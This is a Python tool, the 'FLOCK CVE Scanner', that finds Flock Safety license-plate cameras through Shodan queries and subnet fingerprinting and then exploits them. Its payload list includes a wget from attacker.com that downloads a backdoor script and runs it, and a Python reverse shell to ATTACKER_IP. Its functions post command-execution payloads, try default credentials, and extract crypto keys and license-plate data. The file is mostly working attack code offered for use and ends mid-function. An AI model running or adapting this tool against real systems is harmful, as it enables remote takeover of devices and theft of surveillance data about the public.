#!/usr/bin/env python3
"""
FLOCK CVE Scanner + Discover + Traffic Analysis
Scans for:
  - CVE-2025-59403: Unauthenticated admin API / ADB RCE (9.8)
  - CVE-2025-59407: Hardcoded keystore crypto key (CRITICAL)
  - CVE-2025-47818: Hardcoded fallback hotspot credentials
  - CVE-2025-47823: Hardcoded system password on ALPR firmware
  - Flock instance discovery on local subnet
  - Cloud vs local station data flow detection
"""

import socket
import ssl
import json
import time
import sys
import os
import re
import hashlib
import base64
import threading
import queue
import subprocess
import telnetlib
import struct
from datetime import datetime
from urllib.parse import urlparse, urljoin
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
import argparse
import csv
import random

# Import traffic tap module (optional)
try:
    from flock_tap import FlockTrafficTap, C as TapColors
    HAVE_TAP = True
except ImportError:
    HAVE_TAP = False

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ── Flock-known infrastructure for cloud detection ──
FLOCK_CLOUD_DOMAINS = [
    "api.flocksafety.com", "app.flocksafety.com", "users.flocksafety.com",
    "login.flocksafety.com", "websockets.flocksafety.com", "safelist.flocksafety.com",
    "events.flocksafety.com", "docs.flocksafety.com", "status.flocksafety.com",
    "flock-hibiki-inbox.s3.us-east-1.amazonaws.com",
    "prod-flock-cd-bymknkftygg5gmc0.edge.tenants.auth0.com",
    "internal.flocksafety.com", "prometheus.flocksafety.com",
]

FLOCK_CLOUD_IPS = [
    "198.202.211.1",         # flocksafety.com A
    "52.72.49.79",           # safelist (AWS)
    "34.71.237.120",         # scim (GCP)
    "104.18.16.189",         # websockets (Cloudflare)
    "104.18.17.189",         # websockets (Cloudflare)
]

# ── Flock ONVIF manufacturer fingerprint strings ──
FLOCK_ONVIF_FINGERPRINTS = [
    b"Flock", b"Flock Safety", b"Falcon", b"Sparrow",
    b"admin_page_template", b"SpeedPourer", b"Picard", b"Bravo",
]

class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'

# Extended Shodan queries
SHODAN_QUERIES = {
    'CVE-2025-59403': [
        'title:"Falcon"', 'title:"Sparrow"',
        '"/api/v1/admin"', '"/api/v1/system"', '"/api/v1/debug"',
        'port:5555 "Android"', '"Android Debug Bridge"',
        'port:5037 adb', 'http.title:"ADB"',
        '"Falcon" "api" port:443', '"Sparrow" "api" port:443',
        '"/api/v1/execute"', '"/api/v1/command"',
    ],
    'CVE-2025-59407': [
        '"Android" "v6.35.33"', '"keystore" "hardcoded"',
        '"crypto" "key" "Android"', '"/api/v1/keystore"',
        '"/api/v1/security"', '"hardcoded_key"', '"default_key"',
    ],
    'CVE-2025-47818': [
        '"hotspot" "fallback"', '"/api/v1/hotspot"',
        '"default" "hotspot" "credentials"', '"/api/v1/wifi"',
        '"hotspot" "config"', '"wifi" "credentials"',
    ],
    'CVE-2025-47823': [
        '"ALPR" "v2.0"', '"ALPR" "v2.1"', '"ALPR" "v2.2"',
        '"/api/v1/alpr"', '"license plate" "system"',
        '"LPR" "firmware"', '"ALPR" "firmware"', '"/alpr" "/api"',
    ],
    'FLOCK_DISCOVERY': [
        'title:"admin_page_template"',
        '"admin_page_template.html"',
        '"/onvif/device_service" Flock',
        '"SpeedPourer" port:21',
        '"FRP" "flock" port:7000',
        '"M5NanoC6" "flock"',
        '"flock" "ADB" port:5555',
        'ssl.cert.subject.cn:"*.flocksafety.com"',
        'ssl.cert.subject.cn:"*.ops.flocksafety.com"',
        'org:"Flock Safety"',
        '"flock-hibiki"',
    ],
}


class CVEExploiter:
    def __init__(self, verbose=False, output_file=None, threads=10, timeout=5, exploit=False):
        self.verbose = verbose
        self.output_file = output_file
        self.threads = threads
        self.timeout = timeout
        self.exploit = exploit
        self.results = []
        self.lock = threading.Lock()
        self.work_queue = queue.Queue()
        self.total_scanned = 0
        self.vulnerable_found = 0
        self.exploited = 0
        self.shodan_api_key = None

        self.payloads = {
            'CVE-2025-59403': {
                'command_exec': [
                    'id', 'whoami', 'uname -a',
                    'cat /etc/passwd', 'ls -la /', 'ps aux',
                    'netstat -tulpn', 'ifconfig',
                    'echo "VULNERABLE" > /tmp/test.txt',
                    'wget -O /tmp/backdoor.sh http://attacker.com/shell.sh && chmod +x /tmp/backdoor.sh && /tmp/backdoor.sh',
                    'python3 -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
                ],
                'adb_commands': [
                    'shell id', 'shell whoami', 'shell getprop',
                    'shell pm list packages', 'shell dumpsys battery',
                    'shell input keyevent 26',
                    'shell settings put global adb_enabled 1',
                    'shell settings put secure install_non_market_apps 1',
                ],
            },
            'CVE-2025-59407': {
                'crypto_keys': [
                    'MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA',
                    'LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ==',
                    '-----BEGIN PRIVATE KEY-----',
                    'hardcoded_keystore_password',
                    'android_keystore_key_2024',
                    'default_crypto_key_v6.35.33',
                ],
            },
        }

    # ═══════════════════════════════════════════════════
    #  PRIMITIVE HELPERS
    # ═══════════════════════════════════════════════════

    def _probe_port(self, host, port, proto="tcp"):
        """Quick TCP connect probe."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            r = s.connect_ex((host, port))
            s.close()
            return r == 0
        except Exception:
            return False

    def _http_get(self, host, path="/", port=80, timeout=None):
        """Plain HTTP GET, returns body text or None."""
        try:
            u = f"http://{host}:{port}{path}"
            r = requests.get(u, timeout=timeout or self.timeout, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code < 500:
                return r.text
        except Exception:
            pass
        try:
            u = f"https://{host}:443{path}"
            r = requests.get(u, timeout=timeout or self.timeout, verify=False, headers={"User-Agent": "Mozilla/5.0"})
            if r.status_code < 500:
                return r.text
        except Exception:
            pass
        return None

    def _is_private_ip(self, ip):
        try:
            first = int(ip.split(".")[0])
            if first == 10:
                return True
            if first == 172 and 16 <= int(ip.split(".")[1]) <= 31:
                return True
            if first == 192 and ip.split(".")[1] == "168":
                return True
        except Exception:
            pass
        return False

    def _adb_get_prop(self, host, prop):
        """Try ADB getprop on port 5555."""
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(self.timeout)
            s.connect((host, 5555))
            s.send(f"shell getprop {prop}\n".encode())
            time.sleep(0.5)
            data = s.recv(4096).decode(errors="replace")
            s.close()
            return data.strip()
        except Exception:
            return None

    def _onvif_probe(self, host):
        """Send ONVIF GetDeviceInformation probe."""
        body = (
            '<?xml version="1.0" encoding="utf-8"?>'
            '<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"'
            ' xmlns:tds="http://www.onvif.org/ver10/device/wsdl">'
            '<soap:Body>'
            '<tds:GetDeviceInformation/>'
            '</soap:Body></soap:Envelope>'
        )
        for port in (80, 443, 8899):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(self.timeout)
                s.connect((host, port))
                req = (
                    f"POST /onvif/device_service HTTP/1.1\r\n"
                    f"Host: {host}:{port}\r\n"
                    f"Content-Type: application/soap+xml; charset=utf-8\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n{body}"
                )
                s.send(req.encode())
                resp = s.recv(4096)
                s.close()
                # Check for Flock-specific manufacturer strings
                if any(fingerprint in resp for fingerprint in FLOCK_ONVIF_FINGERPRINTS):
                    # Extract manufacturer/model
                    m = re.search(rb"<tds:Manufacturer>(.*?)</tds:Manufacturer>", resp)
                    model = re.search(rb"<tds:Model>(.*?)</tds:Model>", resp)
                    return {
                        "manufacturer": m.group(1).decode(errors="replace") if m else "unknown",
                        "model": model.group(1).decode(errors="replace") if model else "unknown",
                    }
            except Exception:
                pass
        return None

    def _check_frp_tunnel(self, host):
        """Check if a Flock FRP tunnel server is listening on common FRP ports."""
        for port in (7000, 7500, 7001):
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                # FRP server sends a short banner or waits for auth
                s.settimeout(2)
                try:
                    banner = s.recv(128)
                    if b"frp" in banner.lower() or b"auth" in banner.lower() or len(banner) > 0:
                        s.close()
                        return {"port": port, "banner": banner[:64].decode(errors="replace")}
                except socket.timeout:
                    # Connection accepted but no banner — possible FRP
                    s.close()
                    return {"port": port, "banner": "(no banner — possible FRP tunnel)"}
                s.close()
            except Exception:
                pass
        return None

    def _check_dns_resolve(self, hostname):
        """Check if a hostname resolves to a known Flock cloud IP."""
        try:
            ips = socket.getaddrinfo(hostname, 80)
            return [addr[4][0] for addr in ips]
        except Exception:
            return []

    def _check_cloud_connection(self, camera_ip):
        """
        Probe a suspected camera to determine if it talks to Flock cloud
        or a local station.  Uses three methods:
          A) DNS test on the camera's configured DNS server
          B) Check if the admin web UI contains cloud URLs
          C) Port-scan for local relay
        """
        evidence = []

        # B) Probe admin web interface for embedded cloud URLs
        for path in ("/", "/metadata", "/config", "/config/network", "/status"):
            body = self._http_get(camera_ip, path)
            if body:
                for domain in FLOCK_CLOUD_DOMAINS:
                    if domain in body:
                        evidence.append(f"admin_ui_contains_{domain}")

        # C) Check for local station relay port
        for relay_port in (80, 8080, 9090, 443):
            if self._probe_port(camera_ip, relay_port):
                evidence.append(f"local_relay_port_{relay_port}")

        if evidence:
            if any("admin_ui_contains" in e for e in evidence):
                return "CLOUD", evidence
            return "LOCAL", evidence
        return "UNKNOWN", evidence

    def _traffic_sniff_analysis(self, camera_ip, duration=30):
        """
        Passive DNS / TCP analysis (requires root / scapy).
        Falls back to DNS-resolution test if scapy not available.
        """
        # Fallback: just try to resolve Flock domains — if the camera's
        # network allows it, the camera itself will resolve them.
        reachable = []
        for domain in FLOCK_CLOUD_DOMAINS[:6]:
            ips = self._check_dns_resolve(domain)
            if ips:
                reachable.append(domain)
        if reachable:
            return "CLOUD_REACHABLE", reachable
        else:
            return "NO_CLOUD_REACHABLE", []

    # ═══════════════════════════════════════════════════
    #  FINGERPRINT DISCOVERY
    # ═══════════════════════════════════════════════════

    def discover_fingerprints(self, host):
        """
        Run all Flock fingerprint probes against a single host.
        Returns a list of finding dicts.
        """
        findings = []

        # 1) ADB / Android shell
        if self._probe_port(host, 5555):
            model = self._adb_get_prop(host, "ro.product.model")
            device = self._adb_get_prop(host, "ro.product.device")
            if model and ("flock" in model.lower() or "falcon" in model.lower() or "sparrow" in model.lower()):
                findings.append({
                    "type": "FLOCK_ADB", "port": 5555,
                    "device": model, "cve": "CVE-2025-59403",
                    "detail": f"ADB accessible, model={model}, device={device}",
                })
            elif model:
                findings.append({
                    "type": "ANDROID_ADB", "port": 5555,
                    "device": model,
                    "detail": f"Android ADB open (non-Flock model='{model}')",
                })

        # 2) Admin web UI fingerprints
        for port in (80, 443):
            body = self._http_get(host, "/", port=port)
            if body:
                if "admin_page_template" in body:
                    findings.append({
                        "type": "FLOCK_ADMIN_WEB", "port": port,
                        "cve": "CVE-2025-59403",
                        "detail": "admin_page_template.html found — confirmed Flock admin portal",
                    })
                if "SpeedPourer" in body:
                    findings.append({
                        "type": "FLOCK_SPEEDPOURER", "port": port,
                        "detail": "SpeedPourer FTP reference found on admin page",
                    })
                if "flock" in body.lower():
                    # Generic Flock mention
                    findings.append({
                        "type": "FLOCK_GENERIC", "port": port,
                        "detail": "Page body contains 'flock' text",
                    })

        # 3) ONVIF probe
        onvif = self._onvif_probe(host)
        if onvif:
            findings.append({
                "type": "FLOCK_ONVIF",
                "detail": f"ONVIF device — Manufacturer={onvif['manufacturer']}, Model={onvif['model']}",
                "onvif_info": onvif,
            })

        # 4) FRP tunnel
        frp = self._check_frp_tunnel(host)
        if frp:
            findings.append({
                "type": "FRP_TUNNEL", "port": frp["port"],
                "detail": f"FRP tunnel server on port {frp['port']}: {frp['banner']}",
            })

        # 5) CVE probes (reuse existing logic)
        cve_results = self.scan_and_exploit(host)
        for cr in cve_results:
            findings.append({
                "type": cr.get("cve", "CVE"),
                "detail": f"{cr.get('cve','?')} — path={cr.get('path','')} exploited={cr.get('exploited',False)}",
                "cve_finding": cr,
            })

        # 6) Cloud connection check
        verdict, evid = self._check_cloud_connection(host)
        if verdict != "UNKNOWN":
            findings.append({
                "type": f"DATA_FLOW_{verdict}",
                "detail": f"Data flow verdict: {verdict}. Evidence: {', '.join(evid[:5])}",
            })

        return findings

    # ═══════════════════════════════════════════════════
    #  DISCOVERY RUNNER
    # ═══════════════════════════════════════════════════

    def run_discovery(self, cidr):
        """Multi-threaded subnet discovery for Flock instances."""
        import ipaddress
        net = ipaddress.ip_network(cidr, strict=False)
        hosts = [str(ip) for ip in net.hosts()]
        print(f"{Colors.CYAN}Scanning {len(hosts)} hosts in {cidr} for Flock fingerprints…{Colors.END}")
        print(f"{Colors.YELLOW}Threads={self.threads}, timeout={self.timeout}s{Colors.END}")
        start = time.time()
        discovered = []

        def _discover_worker():
            while True:
                try:
                    h = self.work_queue.get_nowait()
                except queue.Empty:
                    return
                find = self.discover_fingerprints(h)
                if find:
                    with self.lock:
                        discovered.append({"host": h, "findings": find})
                        self.results.append({"target": h, "findings": find, "type": "DISCOVERY"})
                        self.vulnerable_found += len(find)
                with self.lock:
                    self.total_scanned += 1
                    if self.total_scanned % 25 == 0:
                        elapsed = time.time() - start
                        rate = self.total_scanned / elapsed if elapsed > 0 else 0
                        eta = (len(hosts) - self.total_scanned) / rate if rate > 0 else 0
                        sys.stdout.write(
                            f"\r{Colors.CYAN}[{self.total_scanned}/{len(hosts)}] "
                            f"found={len(discovered)} rate={rate:.0f}/s eta={eta:.0f}s{Colors.END}  "
                        )
                        sys.stdout.flush()
                self.work_queue.task_done()

        for h in hosts:
            self.work_queue.put(h)

        threads = []
        for _ in range(min(self.threads, len(hosts))):
            t = threading.Thread(target=_discover_worker, daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()

        elapsed = time.time() - start
        print()
        print(f"\n{Colors.GREEN}Discovery complete in {elapsed:.1f}s{Colors.END}")
        print(f"{Colors.CYAN}Scanned: {self.total_scanned} | Flock instances found: {len(discovered)}{Colors.END}")

        # Show a summary table
        if discovered:
            print(f"\n{Colors.BOLD}{'Host':<18} {'Types':<40}{Colors.END}")
            print("─" * 60)
            for d in discovered:
                types = ", ".join(f["type"] for f in d["findings"])
                print(f"{d['host']:<18} {types:<40}")

        return discovered

    # ═══════════════════════════════════════════════════
    #  TRAFFIC ANALYSIS RUNNER
    # ═══════════════════════════════════════════════════

    def run_traffic_analysis(self, camera_ip):
        """
        Analyze whether a Flock camera sends data to the cloud
        or a local station.  Returns structured verdict.
        """
        print(f"\n{Colors.CYAN}Analyzing data flow for {camera_ip}…{Colors.END}")

        result = {"target": camera_ip, "type": "TRAFFIC_ANALYSIS", "checks": []}

        # 1) DNS – can it resolve Flock cloud?
        dns_verdict, dns_evidence = self._traffic_sniff_analysis(camera_ip, duration=5)
        result["checks"].append({"test": "dns_resolve", "verdict": dns_verdict, "detail": dns_evidence})
        print(f"  DNS resolve: {Colors.YELLOW}{dns_verdict}{Colors.END}")
        if dns_evidence:
            for d in dns_evidence[:5]:
                print(f"    resolves → {d}")

        # 2) Admin UI inspection
        verdict2, evid2 = self._check_cloud_connection(camera_ip)
        result["checks"].append({"test": "admin_ui_inspection", "verdict": verdict2, "detail": evid2})
        print(f"  Admin UI:   {Colors.YELLOW}{verdict2}{Colors.END}")
        for e in evid2[:5]:
            print(f"    {e}")

        # 3) FRP tunnel check
        frp = self._check_frp_tunnel(camera_ip)
        if frp:
            result["checks"].append({"test": "frp_tunnel", "verdict": "FRP_TUNNEL", "detail": frp})
            print(f"  FRP tunnel: {Colors.RED}FOUND on port {frp['port']}{Colors.END}")
            print(f"    banner: {frp['banner']}")
        else:
            result["checks"].append({"test": "frp_tunnel", "verdict": "NO_FRP"})
            print(f"  FRP tunnel: {Colors.GREEN}none{Colors.END}")

        # 4) ADB shell → check network config
        if self._probe_port(camera_ip, 5555):
            gw = self._adb_get_prop(camera_ip, "net.route.gateway")
            dns = self._adb_get_prop(camera_ip, "net.dns1")
            result["checks"].append({
                "test": "adb_network", "verdict": "ADB",
                "detail": {"gateway": gw, "dns": dns},
            })
            print(f"  ADB net:    gateway={gw} dns={dns}")

        # Overall verdict
        verdicts = [c["verdict"] for c in result["checks"]]
        if "CLOUD" in verdicts or "CLOUD_REACHABLE" in verdicts or "FRP_TUNNEL" in verdicts:
            result["overall"] = "CLOUD — data flows to Flock infrastructure"
        elif "LOCAL" in verdicts:
            result["overall"] = "LOCAL_STATION — data stays on-prem"
        else:
            result["overall"] = "INDETERMINATE — unable to determine data flow"

        print(f"\n{Colors.BOLD}Overall: {Colors.END}{result['overall']}")

        with self.lock:
            self.results.append(result)

        return result

    # ═══════════════════════════════════════════════════
    #  EXISTING METHODS (unchanged)
    # ═══════════════════════════════════════════════════

    def print_banner(self):
        banner = f"""
{Colors.RED}================================================================================
                                                                           
    {Colors.YELLOW}███████╗██╗   ██╗███████╗    ███████╗ ██████╗ █████╗ ███╗   ██╗██████╗ ███████╗██████╗{Colors.RED}    
    {Colors.YELLOW}██╔════╝██║   ██║██╔════╝    ██╔════╝██╔════╝██╔══██╗████╗  ██║██╔══██╗██╔════╝██╔══██╗{Colors.RED}   
    {Colors.YELLOW}█████╗  ██║   ██║█████╗      ███████╗██║     ███████║██╔██╗ ██║██████╔╝█████╗  ██████╔╝{Colors.RED}   
    {Colors.YELLOW}██╔══╝  ╚██╗ ██╔╝██╔══╝      ╚════██║██║     ██╔══██║██║╚██╗██║██╔══██╗██╔══╝  ██╔══██╗{Colors.RED}   
    {Colors.YELLOW}███████╗ ╚████╔╝ ███████╗    ███████║╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗██║  ██║{Colors.RED}   
    {Colors.YELLOW}╚══════╝  ╚═══╝  ╚══════╝    ╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝{Colors.RED}   
                                                                           
    {Colors.CYAN}███████╗██╗  ██╗██████╗ ██╗      ██████╗ ██╗████████╗███████╗██████╗ {Colors.RED}           
    {Colors.CYAN}██╔════╝╚██╗██╔╝██╔══██╗██║     ██╔═══██╗██║╚══██╔══╝██╔════╝██╔══██╗{Colors.RED}          
    {Colors.CYAN}█████╗   ╚███╔╝ ██████╔╝██║     ██║   ██║██║   ██║   █████╗  ██████╔╝{Colors.RED}          
    {Colors.CYAN}██╔══╝   ██╔██╗ ██╔═══╝ ██║     ██║   ██║██║   ██║   ██╔══╝  ██╔══██╗{Colors.RED}          
    {Colors.CYAN}███████╗██╔╝ ██╗██║     ███████╗╚██████╔╝██║   ██║   ███████╗██║  ██║{Colors.RED}          
    {Colors.CYAN}╚══════╝╚═╝  ╚═╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝{Colors.RED}          
                                                                           
================================================================================{Colors.END}

{Colors.RED}{Colors.BLINK}WARNING: EXPLOITATION MODULE INCLUDED{Colors.END}
{Colors.YELLOW}Use only on systems you own or have explicit permission to test{Colors.END}

{Colors.BOLD}Vulnerabilities:{Colors.END}
  {Colors.RED}CVE-2025-59403 - Unauthenticated admin API / ADB RCE (Score: 9.8){Colors.END}
  {Colors.RED}CVE-2025-59407 - Hardcoded keystore crypto key (CRITICAL){Colors.END}
  {Colors.YELLOW}CVE-2025-47818 - Hardcoded fallback hotspot credentials{Colors.END}
  {Colors.YELLOW}CVE-2025-47823 - Hardcoded system password on ALPR firmware <=2.2{Colors.END}

{Colors.BOLD}New:{Colors.END}
  {Colors.GREEN} 6) Flock Instance Discovery — scan subnet for all Flock fingerprints{Colors.END}
  {Colors.GREEN} 7) Traffic Analysis — cloud vs local station data flow{Colors.END}

{Colors.BOLD}Mode:{Colors.END} {'SCAN + EXPLOIT' if self.exploit else 'SCAN ONLY'}
{Colors.BOLD}Threads:{Colors.END} {self.threads}
{Colors.BOLD}Timeout:{Colors.END} {self.timeout}s
"""
        print(banner)

    # ── Shodan ──
    def get_shodan_targets(self, api_key):
        targets = []
        try:
            import shodan
            api = shodan.Shodan(api_key)
            print(f"{Colors.CYAN}Searching Shodan for CVE-2025 vulnerable systems...{Colors.END}")
            for cve, queries in SHODAN_QUERIES.items():
                if cve == "FLOCK_DISCOVERY":
                    continue  # covered below
                query = " OR ".join(queries[:3])
                print(f"{Colors.CYAN}Searching {cve}...{Colors.END}")
                try:
                    results = api.search(query, limit=50)
                    for result in results['matches']:
                        targets.append(result['ip_str'])
                    print(f"{Colors.GREEN}Found {len(results['matches'])} targets for {cve}{Colors.END}")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}Warning for {cve}: {e}{Colors.END}")
            if not targets:
                fallback = [
                    '"/api/v1/admin" port:443', '"/api/v1/system" port:443',
                    '"Falcon" "api" port:443', '"Sparrow" "api" port:443',
                    'port:5555 "Android"', '"/api/v1/alpr"',
                ]
                print(f"{Colors.YELLOW}Trying fallback queries...{Colors.END}")
                for q in fallback:
                    try:
                        for r in api.search(q, limit=30)['matches']:
                            targets.append(r['ip_str'])
                    except Exception:
                        pass
            targets = list(set(targets))
        except ImportError:
            print(f"{Colors.RED}Shodan library not installed. Run: pip install shodan{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}Shodan error: {e}{Colors.END}")
        return targets

    # ── CVE scan/exploit methods (preserved exactly) ──
    def exploit_cve_59403(self, target, path, payload):
        results = []
        if 'adb' in str(payload).lower():
            for cmd in self.payloads['CVE-2025-59403']['adb_commands']:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(self.timeout)
                    sock.connect((target, 5555))
                    sock.send(f"{cmd}\n".encode())
                    response = sock.recv(4096).decode()
                    sock.close()
                    results.append({'cve': 'CVE-2025-59403', 'target': target, 'method': 'ADB',
                                    'command': cmd, 'output': response[:500], 'exploited': True})
                    if self.verbose:
                        print(f"{Colors.GREEN}ADB Exploit Success on {target}: {cmd}{Colors.END}")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}ADB exploit failed on {target}: {e}{Colors.END}")
        else:
            for cmd in self.payloads['CVE-2025-59403']['command_exec']:
                if 'ATTACKER_IP' in cmd:
                    attacker_ip = input(f"{Colors.CYAN}Enter your listener IP for reverse shell: {Colors.END}")
                    cmd = cmd.replace('ATTACKER_IP', attacker_ip)
                payload = {'command': cmd, 'cmd': cmd, 'action': 'exec', 'execute': cmd, 'payload': cmd}
                url = f"http://{target}{path}"
                try:
                    resp = requests.post(url, json=payload, timeout=self.timeout, verify=False)
                    if resp.status_code == 200:
                        results.append({'cve': 'CVE-2025-59403', 'target': target, 'path': path,
                                        'command': cmd, 'response': resp.text[:500], 'exploited': True})
                        if self.verbose:
                            print(f"{Colors.GREEN}API Exploit Success on {target}: {cmd}{Colors.END}")
                            if 'root' in resp.text or 'uid=' in resp.text:
                                print(f"{Colors.RED}ROOT ACCESS GAINED{Colors.END}")
                except Exception as e:
                    if self.verbose:
                        print(f"{Colors.YELLOW}API exploit failed: {e}{Colors.END}")
        return results

    def exploit_cve_59407(self, target, path, response_text):
        results = []
        for pattern in self.payloads['CVE-2025-59407']['crypto_keys']:
            if pattern in response_text:
                kp = re.compile(f'{pattern}[A-Za-z0-9+/=]+')
                for key in kp.findall(response_text):
                    results.append({'cve': 'CVE-2025-59407', 'target': target, 'path': path,
                                    'key_found': key[:100], 'exploited': True})
                    if self.verbose:
                        print(f"{Colors.GREEN}Crypto key extracted from {target}{Colors.END}")
        return results

    def exploit_cve_47818(self, target, path, credentials):
        results = []
        u, p = credentials.split(':')
        url = f"http://{target}{path}"
        try:
            resp = requests.get(url, auth=(u, p), timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                for ep in ['/config', '/settings', '/wifi', '/network', '/status']:
                    try:
                        r2 = requests.get(f"http://{target}{ep}", auth=(u, p), timeout=self.timeout, verify=False)
                        if r2.status_code == 200:
                            results.append({'cve': 'CVE-2025-47818', 'target': target, 'path': ep,
                                            'credentials': credentials, 'config_data': r2.text[:500], 'exploited': True})
                    except Exception:
                        pass
        except Exception:
            pass
        return results

    def exploit_cve_47823(self, target, path, credentials):
        results = []
        u, p = credentials.split(':')
        try:
            resp = requests.get(f"http://{target}{path}", auth=(u, p), timeout=self.timeout, verify=False)
            if resp.status_code == 200:
                for ep in ['/vehicles', '/plates', '/camera', '/captures', '/database']:
                    try:
                        r2 = requests.get(f"http://{target}{ep}", auth=(u, p), timeout=self.timeout, verify=False)
                        if r2.status_code == 200:
                            results.append({'cve': 'CVE-2025-47823', 'target': target, 'path': ep,
                                            'credentials': credentials, 'alpr_data': r2.text[:500], 'exploited': True})
                    except Exception:
                        pass
        except Exception:
            pass
        return results

    def scan_and_exploit(self, target):
        results = []
        for path in ['/api/v1/admin/execute', '/api/v1/admin/command', '/api/v1/system/exec']:
            for payload in [{"cmd": "id"}, {"command": "whoami"}]:
                try:
                    resp = requests.post(f"http://{target}{path}", json=payload, timeout=self.timeout, verify=False)
                    if resp.status_code == 200 and any(i in resp.text.lower() for i in ['uid=', 'root', 'executed']):
                        if self.exploit:
                            er = self.exploit_cve_59403(target, path, payload)
                            results.extend(er)
                            with self.lock:
                                self.exploited += len(er)
                        else:
                            results.append({'cve': 'CVE-2025-59403', 'target': target, 'path': path,
                                            'vulnerable': True, 'exploited': False})
                except Exception:
                    pass
        for path in ['/api/v1/crypto/key', '/api/v1/keystore']:
            try:
                resp = requests.get(f"http://{target}{path}", timeout=self.timeout, verify=False)
                if resp.status_code == 200:
                    for p2 in self.payloads['CVE-2025-59407']['crypto_keys']:
                        if p2 in resp.text:
                            if self.exploit:
                                er = self.exploit_cve_59407(target, path, resp.text)
                                results.extend(er)
                                with self.lock:
                                    self.exploited += len(er)
                            else:
                                results.append({'cve': 'CVE-2025-59407', 'target': target, 'path': path,
                                                'vulnerable': True, 'exploited': False})
                            break
            except Exception:
                pass
        for cred in [('admin', 'admin'), ('root', 'root'), ('admin', 'password')]:
            for path in ['/api/v1/hotspot/config', '/api/v1/wifi/credentials']:
                try:
                    resp = requests.get(f"http://{target}{path}", auth=cred, timeout=self.timeout, verify=False)
                    if resp.status_code == 200:
                        if self.exploit:
                            er = self.exploit_cve_47818(target, path, f"{cred[0]}:{cred[1]}")
                            results.extend(er)
                            with self.lock:
                                self.exploited += len(er)
                        else:
                            results.append({'cve': 'CVE-2025-47818', 'target': target, 'path': path,
                                            'credentials': f"{cred[0]}:{cred[1]}",
                                            'vulnerable': True, 'exploited': False})
                        break
                except Exception:
                    pass
        return results

    def worker(self):
        while not self.work_queue.empty():
            target = self.work_queue.get()
            try:
                results = self.scan_and_exploit(target)
                if results:
                    with self.lock:
                        self.results.extend(results)
                        self.vulnerable_found += sum(1 for r in results if r.get('vulnerable', False))
                    for r in results:
                        if r.get('exploited', False):
                            self.print_exploit_result(r)
                        elif r.get('vulnerable', False):
                            self.print_vulnerability(r)
                self.total_scanned += 1
                if self.total_scanned % 5 == 0:
                    os.system('clear' if os.name == 'posix' else 'cls')
                    self.print_banner()
                    print(self.print_scanning_status())
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.RED}Error scanning {target}: {e}{Colors.END}")
            finally:
                self.work_queue.task_done()

    def print_scanning_status(self):
        return f"""
{Colors.CYAN}-------------------------------------------------------------
{Colors.BOLD}SCAN STATUS{Colors.END}
-------------------------------------------------------------
Total Targets : {self.total_scanned}
Vulnerable     : {self.vulnerable_found}
Exploited      : {self.exploited}
Queue Size     : {self.work_queue.qsize()}
Elapsed Time   : {datetime.now().strftime('%H:%M:%S')}
-------------------------------------------------------------
{Colors.END}"""

    def print_exploit_result(self, result):
        cve = result.get('cve', 'Unknown')
        target = result.get('target', 'Unknown')
        print(f"""
{Colors.RED}{Colors.BLINK}EXPLOIT SUCCESSFUL{Colors.END}
{Colors.CYAN}-------------------------------------------------------------
CVE: {cve}
Target: {target}
Method: {result.get('method', 'API')}
Command: {result.get('command', 'N/A')[:30]}
Output: {str(result.get('output', ''))[:40]}
-------------------------------------------------------------
{Colors.END}""")

    def print_vulnerability(self, result):
        cve = result.get('cve', 'Unknown')
        target = result.get('target', 'Unknown')
        colors = {'CVE-2025-59403': Colors.RED, 'CVE-2025-59407': Colors.RED,
                   'CVE-2025-47818': Colors.YELLOW, 'CVE-2025-47823': Colors.YELLOW}
        color = colors.get(cve, Colors.END)
        print(f"""
{color}-------------------------------------------------------------
VULNERABILITY FOUND
-------------------------------------------------------------
CVE: {cve}
Target: {target}
Path: {result.get('path', 'N/A')}
Credentials: {result.get('credentials', 'N/A')}
-------------------------------------------------------------
{Colors.END}""")

    def scan_network(self, targets):
        if not targets:
            print(f"{Colors.RED}No targets to scan{Colors.END}")
            return
        for t in targets:
            self.work_queue.put(t.strip())
        print(f"{Colors.GREEN}Starting {'exploitation' if self.exploit else 'scanning'} with {self.threads} threads{Colors.END}")
        print(f"{Colors.YELLOW}Press Ctrl+C to stop{Colors.END}")
        threads = []
        for _ in range(self.threads):
            t = threading.Thread(target=self.worker)
            t.start()
            threads.append(t)
        try:
            for t in threads:
                t.join()
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}Stopping...{Colors.END}")
        self.print_summary()

    def print_summary(self):
        os.system('clear' if os.name == 'posix' else 'cls')
